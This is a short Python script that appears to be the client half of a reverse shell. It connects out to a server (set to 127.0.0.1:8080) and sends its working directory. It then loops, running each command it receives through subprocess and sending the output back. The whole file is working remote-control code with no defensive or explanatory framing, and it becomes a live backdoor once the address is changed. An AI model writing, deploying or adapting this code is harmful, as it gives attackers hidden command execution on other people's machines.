import socket, subprocess, os, sys

def close():
    s.close()
    print("Closing!")
    exit(0)

SERVER_HOST = "127.0.0.1"
SERVER_PORT = 8080
BUFFER_SIZE = 1024 * 128 #128KB max size

s = socket.socket() #Establish socket connection
s.connect((SERVER_HOST,SERVER_PORT)) #Connect to server

cwd = os.getcwd() #Get current directory and send it to server
s.send(cwd.encode())

while True:
    command = s.recv(BUFFER_SIZE).decode() #Recieve the command from the server and decode it into a string
    splitted_command = command.split() #Split the command
    if splitted_command[0].lower() == "exit": #if the user wants to exit, then break the loop and close the socket
        break
    if splitted_command[0] == "cd": #if the user wants to change directories
        try:
            os.chdir(' '.join(splitted_command[1:])) #use os to change the directory
        except FileNotFoundError as e: #if it isn't a thing, output the error to a variable
            output = str(e)
        else: #if it worked, keep output blank
            output = ""
    else: #if the user doesn't want to change directories, run the command and capture the output
        output = subprocess.getoutput(command)
    
    cwd = os.getcwd() #get the current directory
    message = f"{output}\n{cwd}# " #encapsulate the output and send it
    s.send(message.encode())
s.close() #close the socket 

